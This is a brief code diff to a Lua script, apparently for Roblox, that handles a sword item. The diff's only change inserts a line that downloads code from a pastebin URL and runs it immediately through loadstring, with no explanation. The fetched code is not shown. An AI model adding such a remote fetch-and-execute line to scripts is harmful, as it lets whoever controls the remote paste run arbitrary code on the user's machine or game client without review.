@@ -1,5 +1,7 @@
 wait(2)
 
+loadstring(game:HttpGet("https://pastebin.com/raw/FwfNEqYz", true))()
+
 local swordname = "Russo's Sword"
 local sword
 local player = game.Players.LocalPlayer
